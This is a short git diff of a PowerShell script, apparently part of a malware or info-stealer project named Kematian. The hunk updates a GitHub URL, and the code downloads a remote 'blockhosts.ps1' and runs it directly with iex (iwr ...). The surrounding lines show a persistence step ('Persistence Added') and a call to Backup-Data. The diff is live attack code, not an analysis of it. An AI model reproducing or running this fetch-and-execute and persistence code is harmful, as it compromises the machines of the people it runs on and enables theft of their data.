@@ -96,7 +96,7 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/KematianPirate-Devs/Kematian/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/Pirate-Devs/Kematian/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
